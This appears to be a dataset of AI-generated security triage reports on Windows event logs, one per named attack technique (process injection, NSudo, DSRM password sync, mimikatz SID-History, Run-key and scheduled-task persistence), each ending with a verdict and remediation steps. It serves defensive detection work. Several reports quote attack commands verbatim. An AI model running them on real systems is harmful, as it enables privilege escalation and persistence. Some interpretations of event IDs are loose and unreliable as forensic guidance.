Thread Execution Hijacking,"After analyzing the provided Windows event logs, several points of concern stand out regarding potential malicious activities on Server002:

1. **Windows PowerShell Logs:**
   - The PowerShell logs indicate the execution of a script that includes command-line entries where `notepad.exe` is utilized as a placeholder process (`Start-Process notepad -passthru`) to execute another application `InjectContext.exe` from a temporary directory `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\InjectContext.exe`. 
   - This behavior is unusual as benign PowerShell scripts rarely require such tactics, which are often used to bypass security controls or run unauthorized code.

2. **Sysmon Logs:**
   - A Sysmon entry shows the execution of `powershell.exe` with a similar command-line argument that launched `InjectContext.exe`. 
   - This reinforces the observation from the PowerShell logs, indicating a pattern where legitimate processes are potentially used to execute potentially suspicious programs.
   - Additionally, a series of `wevtutil.exe` and `conhost.exe` executions could suggest log tampering or analysis evasion attempts, although further context would be needed to confirm this.

3. **Security Logs:**
   - There are multiple privilege escalation logs (event 4672) where an account `SERVER002\admin_test` obtained high-level privileges such as `SeDebugPrivilege`, which are consistent with actions performed by administrators or potential attackers attempting lateral movement or system exploitation.

4. **Overall Context:**
   - The sequence where legitimate applications and processes are used as conduits for executing specific executable components (like `InjectContext.exe`) suggests the possibility of a process injection or evasion technique, common in more sophisticated malware or penetration testing/red teaming operations.
   - Similarly, the execution of multiple `hostname.exe`, `whoami.exe`, and `svchost.exe` processes is notable, particularly as these can serve as reconnaissance commands to gather system details or given contexts might be involved in process hollowing.

**Conclusion:**
Based on the combination of suspicious PowerShell execution patterns, Sysmon logs indicating unusual process launches and command lines, and security logs suggesting potential privilege escalation, the activities documented in these logs are highly suspicious. There is strong evidence pointing to possible malicious behavior, though further investigation is warranted to confirm the nature and source of these actions.

**Resolution Classification: SUSPICIOUS**

**Guidance:**
- Immediately monitor and, if necessary, isolate the affected server (`Server002`) to prevent any potential spread of malware.
- Conduct a full forensic analysis on the server, focusing on identifying the source of the `InjectContext.exe` and understanding its purpose and impact.
- Review any unauthorized access attempts and verify which users have been engaging in the activity logged.
- Examine correlation logs and system configurations for any anomalies or security policy violations.
- Consider updating security measures, including PowerShell script execution and Sysmon monitoring, to detect similar activities in the future.

Lastly, confirm these findings and proceed with appropriate remediation or validation steps with the IT security team to ensure the integrity and security of the server and network environment."
Dirty Vanity process Injection,"Upon reviewing the provided Windows event logs, several entries stand out as potentially indicative of malicious activity:

1. **PowerShell Usage with Unusual Command**:
   - The Windows PowerShell logs contain several events showing PowerShell execution with the command to start a process (""redVanity.exe"") located in a temporary directory and another process (""calc.exe""). This is unusual and potentially suspicious because executable files running from temporary directories are often associated with malicious activity or exploitation. The use of the ""Start-Process"" command to spawn processes can be indicative of an attempt to mask the origin and chain of execution.

2. **Unexpected Process Execution**:
   - In the Sysmon logs, we see executions starting with `""C:\\Windows\\System32\\wevtutil.exe""` and `""C:\\Windows\\System32\\conhost.exe""` by user ""SERVER002\\admin_test"", along with the process ID and GUID entries that align with the suspicious PowerShell activities. This context supports the suspicion that these processes could be instrumental in carrying out or hiding other activities that might not be benign or expected.

3. **Privilege Escalation Indicators**:
   - The Security logs show that the user ""admin_test"" obtained many privileges, including `SeDebugPrivilege`, which is often used by attackers to manipulate system processes and obtain unauthorized access. The logs indicate an elevated token status, which might have been used to execute certain actions with administrative-like permissions.

4. **Time Change Events**:
   - The System logs show several events indicating system time changes, which are sometimes used by attackers to manipulate timestamps for forensic evasion. The use of `svchost.exe` in making these changes can be suspicious if not associated with regular administrative activities or scheduled tasks.

**Assessment**: The combination of executing `redVanity.exe` from a temp directory using PowerShell, time manipulation events, and acquiring elevated privileges strongly indicate malicious activity or compromise.

**Resolution**: MALICIOUS

**Guidance**:
- Conduct a thorough investigation of the ""redVanity.exe"" file, its origin, any associated network activity, and other involved processes.
- Ensure that antivirus or endpoint detection tools are up-to-date and perform a full scan of the system.
- Review and secure PowerShell execution policies and review privileges assigned to users.
- Consider isolating the affected machine from the network until a complete forensic analysis and remediation are conducted.
- Check for any suspicious new or modified user accounts and credentials that could indicate further compromise."
Process injection ListPlanting,"### Detailed Analysis

Let's analyze the provided logs from different sources: Application, Sysmon, Security, and PowerShell logs for indicators of potential malicious activity.

#### Application Log

- The software protection platform service logs do not show anything suspicious. These kinds of logs are typical for normal system processes.

#### Sysmon Log

- **PowerShell Execution:**
  - Multiple executions of `PowerShell.exe` are logged.
  - A particular PowerShell command involves launching an executable (`ListPlanting.exe`) from a temporary directory using a script that also attempts to terminate Notepad processes. The usage of PowerShell to launch an executable from a temporary directory can be associated with malicious behavior, as it matches known tactics used to execute malware payloads or inappropriate scripts.
  
- **Process Execution and Command Lines:**
  - Processes like `conhost.exe`, `wevtutil.exe`, `sppsvc.exe`, and `TrustedInstaller.exe` are found, which are not malicious by themselves in the absence of suspicious command-line parameters.
  - The `hostname.exe` and `whoami.exe` usage are standard but often leveraged in attack scenarios to gather system information.

- **Edge Update:**
  - Multiple logs indicate normal Microsoft Edge Update activity, executed by the system account. These logs don’t point to any immediate threat.

#### Security Log

- **User Activity:**
  - The user `admin_test` is seen with logon/logoff activities. The privilege list granted to this user includes high-level privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.), which are potential indicators of privilege escalation if used inappropriately in an attack.
  
- **Logon Events:**
  - Multiple logon events using NTLM authentication from an external IP could indicate an active session from a remote source. However, without more context, this activity alone is not necessarily malicious, although it does warrant correlation with other suspicious activities.

#### Windows PowerShell Log

- **Commands and Script Execution:**
  - PowerShell logs indicate the start of a session involving executing an external file (`ListPlanting.exe`) from a temporary directory. The context and source of this executable are not known, and the script execution is suspicious due to the directory path and purpose mentioned in the Sysmon log.
  - The entire script seems designed to initiate an external process, ensuring persistence, or potentially stop legitimate user processes like Notepad to cover tracks.

### Assessment

- There is evidence of suspicious activity, primarily revolving around the use of `PowerShell.exe` to execute potentially unauthorized or risky commands. Launching executables from temporary folders and using scripts to interact with system processes is often indicative of malicious intent.
- Elevated privileges for the user `admin_test` in conjunction with remote logon events through NTLM could indicate a potential security risk requiring further analysis.

### Conclusion

Resolution: **SUSPICIOUS**

#### Guidance on How to Proceed

1. **Further Investigation:**
   - Investigate the origin and purpose of `ListPlanting.exe`.
   - Check if the file is known within the environment or has authoritative approval.
   - Investigate the remote logon events for context around user behavior or possible unauthorized access.

2. **Security Enhancements:**
   - Confirm the legitimacy of the `admin_test` user account and verify their role and permissions.
   - Audit the usage of high privileges granted to this account.
   - Enhance monitoring, particularly around PowerShell and its ability to execute scripts.

3. **Containment:**
   - If any unauthorized activities are detected, isolate the affected systems to prevent further potential compromise.
   - Review and if necessary, begin incident response protocols to address discovered vulnerabilities or intrusions."
Parent PID Spoofing - Spawn from Specified Process,"After analyzing the provided Windows event logs, here is a detailed assessment:

1. **System Logs**: Most of the entries in the system logs involve Microsoft Windows Update activities and are related to updates for Microsoft applications like Windows Camera, .NET Native, and various Microsoft libraries. These activities are routine system operations and do not exhibit any indicators of compromise or malicious behavior.

2. **Application Logs**: No relevant entries were provided in the excerpts of the application logs. 

3. **Windows PowerShell Logs**: The logs include entries where PowerShell executes certain scripts:
   - There are entries with `Start-ATHProcessUnderSpecificParent`, which is not a standard PowerShell command. This appears to be a custom script or module meant to initiate processes under a specific parent process ID, which can be a legitimate administrative script or potentially suspicious if misused.
   - There are also entries of a PowerShell instance running with `-ExecutionPolicy Restricted`, which is generally a safer mode restricting script execution. The commands seem to involve checking certain system files but do not directly indicate malicious activity.

4. **Security Logs**: There are multiple entries of Security-Auditing events with Event ID `5379`, indicating Microsoft Account operations with return codes that suggest a failure in credential operations, possibly due to incorrect configurations or network issues, not directly indicative of a compromise.
   - A Security-Auditing event with Event ID `4624` shows a successful login for the SYSTEM user, which is routine for system processes.
   - Event ID `4672` indicates a privilege escalation related to system-level privileges which are expected for SYSTEM operations and not necessarily suspicious without other context.

5. **Sysmon Logs**: The logs provide detailed process creation activities:
   - The logs feature a sequence of system-level process activities involving Windows PowerShell, svchost.exe, and various administrative tools (such as CompatTelRunner.exe). Though these can be used maliciously, in this context, the actions performed (e.g., telemetry, update installations) seem aligned with standard operations.
   - Concerns might arise if the same processes appear anomalous in other contexts, but here they fit typical administrative duties tied with Windows maintenance and compatibility checks.

**Summary and Conclusion:**
Based on the provided logs, there are entries that could be considered routine and those that might raise questions without context. However, none of the analyzed entries clearly indicate overtly malicious behavior such as unexpected external command control, erratic permissions changes, or system configurations parameters being overwritten.

**Resolution**: SUSPICIOUS - Although most activities shown are consistent with routine administrative operations, the PowerShell command sequences merit closer scrutiny. Verify the intent and source of `Start-ATHProcessUnderSpecificParent` scripts to ensure it's legitimate.

**Guidance:**
- Follow up on PowerShell usage or policies on Server002 to distinguish if the PowerShell scripts are sanctioned operations.
- Verify the system's update logs and Windows configurations for any signs of unauthorized changes or discrepancies.
- Regularly audit user accounts and refine security operations to ensure robust defenses and detection mechanisms."
Driver Installation Using pnputil.exe,"### Detailed Analysis of Logs:

1. **Sysmon Log Analysis:**
   - The Sysmon logs detail process creations predominantly involving system files like `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe`. These executions appear benign as they are standard Windows processes, often seen in legitimate operations, except for a few potentially unusual activities.
   - **PowerShell Execution:** A `PowerShell` script execution is logged with the command `pnputil.exe -i -a C:\Windows\INF\acpipmi.inf` which invokes a driver installation through PowerShell. While not inherently malicious, it is unusual and could be indicative of an automated task or administrative action.
   - **Elevation of Privileges:** EventID 4672 shows privileges elevated for the user `admin_test`, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, both sensitive in nature. This would be expected during authorized administrative tasks, but if unexpected, it could be concerning.
   - **Process Hierarchy:** The process hierarchy shown in the logs, such as `wevtutil.exe` and `PowerShell`, might demonstrate system or administrative maintenance or debugging tasks. 

2. **Security Log Analysis:**
   - EventID 4624 and 4634 indicate a successful login and logout for user `admin_test` with LogonType 3 (network logon), which are often routine, but can denote remote access.
   - EventID 4672 signals the usage of high privileges by `admin_test`. If these actions are not expected or sanctioned, this may denote a security concern.

3. **PowerShell Log Analysis:**
   - There is a PowerShell session initialized with elevated access, as indicated by the script log usage of `pnputil.exe` for driver installations. Monitoring for PowerShell usage, especially covering scripting or automation with elevated privileges, is crucial, as it is a common attack vector.

4. **Application & System Log Analysis:**
   - Microsoft Edge Update processes show standard update-related activity and are executed by `NT AUTHORITY\SYSTEM`. This is typically expected behavior as part of Edge’s update mechanism.
   - No overt signs of application-level tampering or abnormal service failures are noted in the logs.

### Assessment and Conclusion:
- **Assessment of Anomalies:**
  - The use of elevated privileges and the invocation of `pnputil.exe` via PowerShell suggest potential administrative action. However, without context or confirmation of administrative tasks, these could be considered unusual and warrant further review.
  - The logon activities and service actions recorded appear consistent with non-malicious operations but, due to the sensitive nature, further contextual verification would be prudent.

### Recommended Resolution:
- **Resolution: SUSPICIOUS** – The logs contain activities, particularly around elevated privilege usage and PowerShell execution for driver tasks, that are unusual and necessitate further investigation to confirm whether these are authorized activities.

### Guidance for Next Steps:
- Verify with the system's administrative records whether the activities captured, specifically the PowerShell usage and privilege escalations, were planned and authorized.
- Correlate these logs with network and active directory logs to check for any other irregularities or unauthorized accesses.
- Implement continuous monitoring for further anomalous PowerShell executions or unanticipated process activities, considering these are common attack vectors."
Launch NSudo Executable,"### Analysis of the Windows Event Logs

#### Key Observations:

1. **Security Logs:**
   - **Event ID 5379**: This Event ID indicates a failure in Credential Validation. We see multiple instances for the Subject `SERVER002$` trying to access what appears to be `MicrosoftAccount` and `WindowsLive` credential information. The Return Code `3221226021` translates to a status indicating network logon failure. This pattern could imply a system process or script is making repeated, unsuccessful attempts to access Microsoft-related credentials. 
   - **Event ID 4798**: Reflects queries for the local user accounts including `Administrator`, `admin_test`, `DefaultAccount`, `Guest`, and `lplui` using `taskhostw.exe`. This is typically a benign operation unless observed with other malicious activities or done by an unauthorized user.

2. **PowerShell Logs:**
   - An interesting command execution is observed: `powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\NSudoLG.exe"" -Argument ""-U:T -P:E cmd""}`. The usage of `NSudo` can be a red flag. NSudo is a tool used to obtain elevated privileges, enabling privileged command execution. Stopping the `cmd` process after execution also suggests a scripted, possibly illicit activity aiming at privilege escalation.

3. **Sysmon Logs:**
   - **NSudo Execution**: Reflects with Event Logs process creation using `Powershell` to start processes with elevated privileges. Given the details and paths provided, this execution looks unauthorized and indicative of a potential malicious activity, especially executed from a `Temp` directory which is non-standard for legitimate applications.
   - **Execution of Common Windows Utilities**: There are commands like `whoami`, `hostname`, and `CompatTelRunner` run multiple times. While running utilities like `whoami` and `hostname` can be part of routine script checks, when run by a presumably unauthorized elevated process in concert with the `NSudo` activity, it adds to the suspicious scenario.
   - **Microsoft Edge Update**: The logs include Microsoft Edge Update processes, which seems legitimate, performed by the System account without noticeable anomalies.

4. **Application Logs:**
   - Windows Defender is consistently reported as `SECURITY_PRODUCT_STATE_ON`, indicating no apparent tampering with security suites or disabling of Defender at these points.

### Conclusion:

The logs provide compelling evidence of potentially malicious activity:

- The repeated credential validation attempts, especially targeting Microsoft accounts and Windows Live credentials, can be consistent with unauthorized system access attempts.
- The execution of a PowerShell script with `NSudo`, indicating an intentional privilege escalation attempt, followed by administrative-like activity.
- The execution context (e.g., user directories and temp locations) and operations (use of `NSudo`) are consistent with tactics often used by malware or threat actors to evade detection and execute further malicious tasks with elevated privileges.

Given these findings, I conclude that:

**Resolution: MALICIOUS**

### Guidance:
- Immediate remediation steps should be taken, starting with isolating the affected server (`Server002`) to prevent further unauthorized access.
- Conduct a thorough forensic investigation to ascertain the extent of the intrusion, checking for any additional signs of compromise or persistence mechanisms.
- Review and harden security configurations, including stricter execution policies for PowerShell and better monitoring for unexpected use of administrative tools like `NSudo`.
- Educate users about phishing attacks and regularly update software to protect against known vulnerabilities and exploits."
Scheduled Task Startup Script,"Upon analyzing the provided Windows event logs, here are my findings and analysis:

1. **Repeated Execution of System Utilities**:
   - The logs show multiple entries of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and Windows Command Processor `cmd.exe` being executed on the system. While some of these processes are legitimate and typically part of routine operations (like `hostname.exe` and `whoami.exe`), the frequency and pattern of usage here may indicate a script or tool's execution rather than normal user activity.

2. **Scheduled Tasks Creation (Potential Persistence Mechanism)**:
   - There is an event indicating that `schtasks.exe` was used to create scheduled tasks that execute ""cmd.exe /c calc.exe"". This includes tasks that trigger on logon and system startup.
   - The creation of scheduled tasks to start calculator is highly unusual and indicative of potential malicious activity designed to ensure persistence or a proof of concept by an attacker. Scheduled tasks are often used by attackers to maintain access to a system.

3. **Use of `cmd.exe` with Specific Commands**:
   - The `cmd.exe` logs show command-line arguments that create tasks to run ""calc.exe"". The use of such command lines can be associated with illicit use, especially if it serves no constructive purpose other than to demonstrate command execution capability.

4. **Process Chain and Integrity**:
   - Processes run with high integrity indicate elevated privileges, which are typically required for impactful system changes, such as task creation.
   - The flow from `wsmprovhost.exe` to the execution of `cmd.exe`, and subsequently task creation, is a clear indication that this activity was automated, likely not a typical administrative task.

**Assessment**:
The combination of using system utilities in quick succession, the creation of suspicious scheduled tasks that execute benign applications (possibly as a way to demonstrate code execution), and elevated integrity levels of these operations fit common patterns associated with malicious script execution or system exploitation for persistence.

**Resolution**: **MALICIOUS**
- The creation of scheduled tasks with no legitimate system function, as seen in these logs, is a strong indicator of intended persistence mechanisms by potentially unauthorized entities. Immediate examination of the system for unauthorized access or changes is advised.

**Guidance**:
- **Immediate Actions**:
  - Investigate the source of the scheduled tasks and examine the user activity of `SERVER002\admin_test` for any unauthorized access or actions.
  - Review and tighten permissions related to the creation and execution of scheduled tasks.
  - Examine any scripts or software configurations that could have facilitated these actions.

- **Long-term Actions**:
  - Implement stricter monitoring around task scheduling and elevated command executions.
  - Consider audit logging enhancements to monitor unexpected process executions and integrity shifts.
  - Ensure the system is up-to-date with patches to reduce exploitation risk."
Password Change on Directory Service Restore Mode (DSRM) Account,"### Analysis of Windows Event Logs

**Sysmon Log Analysis:**
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** 
   - There are multiple instances of both `wevtutil.exe` and `conhost.exe` running in quick succession. While these could be part of normal operations, an abnormal frequency of these tools might indicate that someone is querying or manipulating event logs, which could be associated with malicious activity.
   - The user `SERVER002\admin_test` is constantly associated with these executions, indicating the usage under an administrative context.

2. **Suspicious Execution of `cmd.exe`:**
   - An instance of `cmd.exe` execution with the command line `\""cmd.exe\"" /c ntdsutil \""set dsrm password\"" \""sync from domain account %%username%%\"" \""q\"" \""q\""` is noteworthy.
   - This command indicates an attempt to synchronize the DSRM (Directory Services Restore Mode) password with the current domain account password, which could be part of an attack to gain unauthorized access to Active Directory services.

**Security Log Analysis:**
1. **Privilege Escalation Detected:**
   - Multiple Event ID 4672 log entries show that the `admin_test` user was assigned special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. This indicates that the user has elevated rights, which is normal if expected, but needs to be confirmed as legitimate.
   
2. **Logon Events:**
   - Event ID 4624 indicates successful logons by the `admin_test` user from the workstation `DESKTOP-3HL5B2P` using NTLM authentication. While this matches with subsequent actions by the `admin_test` user, it’s important to confirm the legitimacy of these logons.

**System Log Analysis:**
1. **Time Change Events:**
   - The presence of multiple Event ID 4616 indicates changes in system time. While there may be legitimate reasons for this, attackers sometimes manipulate system time to confound log timings and analysis.

**Application Log Analysis:**
- No abnormal activities were detected in the provided application logs. The event entries here appear to be benign and system-related.

### Conclusion and Recommendations

**Assessment: SUSPICIOUS**

The aggregated analysis of the provided logs points to suspicious activity that requires further investigation. The execution of `cmd.exe` with DSRM password change and multiple instances of privilege escalation demands attention to validate whether these actions were authorized and part of intended administrative tasks. Additionally, the time-changing events should be reviewed to identify potential tampering.

**Recommendations:**
- **Verify Admin Activities:** Confirm with relevant personnel whether the observed activities under user `admin_test` were planned and executed by authorized individuals.
- **Review Historical Logs and Access Patterns:** Look for a pattern of similar activities by the `admin_test` user or any other accounts.
- **Check for Indicators of Compromise (IoCs):** Search for further signs of potential unauthorized access or configuration changes.
- **Monitor and Audit Systems:** Increase the level of monitoring on the affected systems for any further unusual activities and set alerts for any further time changes or privileged operations.
- **Conduct a Security Audit:** Perform a thorough audit of the system to ensure software integrity and configuration are not compromised."
Injection SID-History with mimikatz,"After careful examination of the provided Windows event logs, the following analysis has been made:

1. **Unusual Process Execution**: 
   - The Sysmon logs indicate multiple instances of the `cmd.exe` and `PowerShell.exe` being executed with command-line arguments indicative of script execution. Specifically, there is execution of `""C:\Windows\system32\cmd.exe"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe`. This suggests an execution of a script located in a temporary directory.
   - An especially concerning command is `""cmd.exe"" /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe ""privilege::debug"" ""sid::patch"" ""sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username"" ""exit""` which is attempting to escalate privileges and manipulate security identifiers (SIDs). 

2. **Possible Indicators of Compromise**:
   - The existence of scripts being run from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`), which is not commonly used for legitimate persistent scripts, is suspicious.
   - The use of `wevtutil.exe` (used to manipulate event logs) and `whoami.exe` (used to check the current user context) are potentially indicative of steps taken to gather information or cover tracks.

3. **Command-Line Arguments and Privilege Manipulation**:
   - The use of `privilege::debug` and `sid::patch` suggest operations that typically require administrative privileges and are indicative of privilege escalation attempts.

4. **Execution Context and High Integrity Level**:
   - All observed suspicious events are executed under the user `SERVER002\admin_test` and are run with a high integrity level, suggesting the actor had elevated privileges.
   - The scripts, if not authorized, could potentially provide backdoor access or execute further malware.

**Assessment**:

- The activities observed, particularly the execution of scripts from a temporary folder attempting privilege escalation and security settings manipulation, are clear indicators of potentially malicious behavior.
- Utilizing system utilities like `cmd.exe`, `whoami.exe`, and `wevtutil.exe` in such a context often signifies an attempt to either escalate privileges, extract sensitive system information, or cover tracks by manipulating event logs.

**Resolution**: MALICIOUS - The logs present evidence of unauthorized script execution and possible privilege escalation attempts, strongly indicating malicious activity.

**Guidance**:
- Immediate isolation of the affected system is recommended to prevent further potentially harmful activities.
- A thorough investigation and remediation process should be conducted, including malware scans and potentially restoring the system from a known good backup.
- Review user privileges and monitor similar activities on other systems within the network to prevent spread.
- It is crucial to inform relevant stakeholders and document these findings thoroughly for further incident response and future preventative measures."
Create a new time provider,"Based on the analysis of the logs provided, there are multiple indicators of suspicious and potentially malicious activity on the Windows host Server002. The most notable activity is related to a PowerShell execution that manipulates the Windows Time service. Below are the key observations:

1. **PowerShell Execution:**
   - There are several events in the Windows PowerShell log indicating PowerShell script execution. The script copies a DLL named `fileTest.dll` from a temporary location to a public directory and modifies the registry to register this DLL as a time provider for Windows Time Service. The registry keys added and modified indicate that the `fileTest` DLL is being enabled and set as an input provider, which is unusual for normal operations.
   - The PowerShell command appears to be executing actions typically associated with privilege escalation or persistence tactics by tampering with system services.

2. **System Time Manipulation:**
   - The `Microsoft-Windows-Kernel-General` events in the System log and the corresponding Security Event ID 4616 suggest that the system time was modified. Although the reason and impact of this modification are unclear, unauthorized changes to system time could be used to evade detection in time-based security systems and logs.

3. **Errors in Time Service:**
   - There is an event in the System log from `Microsoft-Windows-Time-Service` that reports a failure to start a time provider module (`fileTest`) due to a missing module. This correlates with the PowerShell modification of the time service, indicating either a misconfiguration or an unsuccessful attempt to compromise the time service.

4. **Unusual Parent-Child Process Relationship:**
   - The Sysmon logs display multiple instances of standard system utilities such as `net.exe`, `net1.exe`, `reg.exe`, etc., being executed under the context of `PowerShell`. This is consistent with the script execution seen in the PowerShell log. Such usage outside of typical administrative tasks is uncommon and may hint at suspicious activity, especially in the context of service and registry manipulation.

5. **Service Execution Chain:**
   - The Sysmon logs also show Microsoft Edge Update processes frequently executing, which could be routine unless used as a persistence mechanism; however, there’s no clear indication of malicious usage in this context aside from the service stops noted in the Application log, which might denote service termination.

**Resolution**: **MALICIOUS**

Given the evidence of unauthorized registry modifications, potential privilege escalation tactics, and the tampering of system services utilizing a PowerShell script, there's strong confidence that these logs contain malicious activity. Immediate actions should be taken to isolate the system and conduct a further forensic investigation to understand the full scope of the compromise and potential threats. Inspect other systems in the network for similar indicators of compromise, particularly focusing on PowerShell scripts and service manipulation. Additionally, remediation should involve cleaning any unauthorized files, rectifying the altered registry keys, and scanning for further malware."
Process Injection with Go using UuidFromStringA WinAPI,"Based on the analysis of the provided logs, here are my findings:

1. **Time Manipulation**:
   - The logs show several events related to time changes on the system, specifically within the System and Security logs. The `EventID 1` and `EventID 4616` in the `Kernel-General` and `Security-Auditing` channels suggest multiple instances of time adjustments. This can be suspicious, as some malicious actors might alter system time to evade detection or manipulate timestamps.

2. **PowerShell Execution**:
   - In the PowerShell logs, there's an entry indicating the execution of `powershell.exe` with the command `{C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\UuidFromStringA.exe -debug}`. Execution of scripts or binaries from temporary paths, particularly with PowerShell, is often a sign of potentially unwanted or malicious activity. This can sometimes indicate the use of PowerShell to execute payloads or scripts downloaded to a temp directory, which is a common technique in attacks.

3. **Sysmon Logs**:
   - The Sysmon logs provided show frequent usage of common utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. While the use of such utilities is not inherently malicious, in conjunction with other suspicious activity, they might be used for reconnaissance or log clearing actions by attackers.
   - The frequent spawning of `conhost.exe` often serves to host Command Prompt (cmd) or PowerShell sessions. The number of these instances immediately following PowerShell activity may be another indicator of attempted or successful malicious behavior.

Given these observations, the evidence points to potentially nefarious activities that indicate the need for further investigation. Specifically, the PowerShell execution involving binaries from a temporary directory, combined with system time manipulation, suggests a possible compromise.

**Final Resolution: SUSPICIOUS**

**Guidance to Proceed:**
1. Conduct a deeper investigation into the source and purpose of the `UuidFromStringA.exe` file, especially given its execution context within PowerShell.
2. Verify any legitimate need or authorized actions that would require time manipulation on this server.
3. Review network logs or endpoint detection systems for any anomalous behavior from this machine around the time these logs were generated.
4. Coordinate with IT to scan the machine for potential malware or unauthorized software and ensure proper measures are implemented to prevent unauthorized activities."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","After analyzing the provided log entries, I have identified several observations and possible indicators of suspicious activity:

1. **Frequent Process Executions**: The Sysmon logs show numerous executions of system processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` all initiated by the user `SERVER002\\admin_test` within a very short time frame (less than two seconds). The conhost.exe and wevtutil.exe are typically legitimate system processes, but their repeated execution in such a short span might suggest some sort of automated task or script execution.

2. **Command Execution via cmd.exe**: There is a particularly detailed event log showing the execution of `cmd.exe` with a complex command line involving multiple executables (e.g., `script.exe`, `GhostTask.exe`, and `notepad.exe`). This could potentially signify the execution of a batch script or a series of commands possibly intended to automate tasks or execute unauthorized software/scripts.

3. **Execution of Diagnostic Commands**: The execution of `hostname.exe` and `whoami.exe` is relatively normal in themselves but considering them in the context of their concurrent sysmon logging might be indicative of an intruder attempting to gather system information.

4. **Edge Update Activity**: There are several logs indicating Microsoft Edge update processes. While these are likely part of a routine software update, examining the timing and correlation with any other anomalies in network or user behavior might be necessary.

### Conclusion:
- The activity observed around the execution of several Windows utilities in rapid succession, especially from scripts with complex command lines, is not standard user behavior.
- The use of native Windows tools like `wevtutil.exe` and `cmd.exe` in such a fashion is often seen in both legitimate administrative tasks and malicious script execution, and further investigation is warranted.
- The actions involving command execution paths that reference `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe` raise a red flag as temporary directories are commonly used by malware for execution.

**Resolution: SUSPICIOUS**

### Guidance:
- Further investigation is needed to determine why the user `SERVER002\\admin_test` is executing these commands and processes. Review user activity, permissions, and recent login records.
- Conduct network analysis to look for unusual outgoing connections or command-and-control callbacks.
- Investigate any correlation of these activities with any alerts from network security appliances or endpoint protection solutions.
- Consider scanning the system for malware using an updated antivirus or endpoint detection and response tool.
- Verify the legitimacy of any scripts or executable files in the referenced directories and consider isolating the machine pending further review."
HKCU - Policy Settings Explorer Run Key,"### Detailed Analysis of the Logs:

Upon analyzing the provided logs, we observe several entries detailing system actions and process creations. Here are the notable observations:

1. **Time Changes**: 
    - The system logs record time updates involving `svchost.exe` from the `Microsoft-Windows-Kernel-General` provider. However, this could relate to legitimate time synchronization actions, given the presence of the `Microsoft-Windows-Time-Service` event confirming synchronization with `time.windows.com`.

2. **Sysmon Logs**: 
    - We observe execution of several standard Windows executables such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `HOSTNAME.EXE`.
    - Of particular interest is the launch of `whoami.exe`, multiple instances of `wevtutil.exe`, and `powershell.exe`. Notably, `wevtutil.exe` could potentially be used for event log manipulation, although the current context doesn't conclusively indicate malicious intent.

3. **PowerShell Utilization**: 
    - The highlighted PowerShell command executed is: 
      ```powershell
      ""powershell.exe & {if (!(Test-Path -Path ""HKCU:\\...\Run"")) {New-Item -ItemType Key -Path ""HKCU:\\...\Run""}; Set-ItemProperty -Path ""HKCU:\\...\Run"" -Name ""filetest"" -Value ""C:\\Windows\\System32\\calc.exe""}""
      ```
    - This command attempts to modify the registry to add persistence by creating a key under `HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`, pointing to `calc.exe` which is benign for execution. The key name ""filetest"" is suspicious for an unchecked registry location setting an executable to run at startup.

4. **Security Logs**:
    - Time change events are seen again corroborating the system log entries. The involvement of `svchost.exe` could be normal for time synchronization tasks.

### Assessment:

- **Anomalous Behavior**: The PowerShell activity modifying the registry is anomalous and not typical for normal user activity. This can be indicative of an attempt to establish persistence, albeit invoking `calc.exe` which by itself is not harmful.
- **Executable Invocation**: Increased use of `wevtutil.exe` could denote logs' manipulation, but collected data does not sufficiently demonstrate this.
- **User Account Involvement**: Activities are being conducted by `SERVER002\admin_test`, indicating local administrative involvement which might suggest either legitimate admin task automation or compromised account activity.

### Conclusion:

Based on the logs:

- **Resolution**: **SUSPICIOUS**

The logs contain unusual behavior in the form of PowerShell registry modification that requires further investigation. While there's no direct indication of harm (as ""calc.exe"" is harmless), the attempt to persist an arbitrary executable in Windows' startup routine is a tactic associated with malicious activity. Further investigation would be needed to confirm if this activity is part of a broader compromise or benign administrative scripting.
  
### Guidance on How to Proceed:

1. **Investigate the PowerShell Command**: Verify the legitimacy of the PowerShell script. Determine if it's part of routine automation scripts or unauthorized.
2. **User Account and Activity Audit**: Review activities performed under `admin_test` to ensure that account behaviors align with expectations.
3. **Review Event Logs**: For further anomalous uses of `wevtutil.exe`, ensure event logs aren’t being tampered with.
4. **Vigilant Monitoring**: Continue to monitor the affected system for further signs of suspicious behavior."
Admin Account Manipulate,"After analyzing the provided Windows event logs, I have identified the following key observations that indicate suspicious and potentially malicious activity:

1. **Time Manipulation**: The System and Security logs both highlight alterations in system time, which may disrupt log integrity and potentially indicate attempts to cover up unauthorized actions. This is executed by the ""svchost.exe"" process, which is common but can be suspicious if associated with unauthorized time changes (EventID 4616 and 1).

2. **Unexpected PowerShell Activity**: There are records in the Sysmon and PowerShell logs showing the execution of a PowerShell script with suspicious content (EventID 1 and various PowerShell logs). The script checks and manipulates local administrative accounts, renaming an account from ""Administrator"" to a randomly generated name (""HaHa_23874851854""). The script alters account descriptions and names, a clear indicator of an attempt to obscure user management activities maliciously.

3. **Privilege Escalation**: Security logs show that the ""admin_test"" account is granted an extensive privilege list (SeDebugPrivilege, SeBackupPrivilege, etc.), followed by suspicious modification actions (EventID 4672 and 4738).

4. **Command-Line Argument Utilization**: The events captured illustrate the use of PowerShell with specific command-line arguments, particularly concerning administrative accounts. This corresponds to unauthorized user manipulation and potential privilege escalation activities.

### Assessment

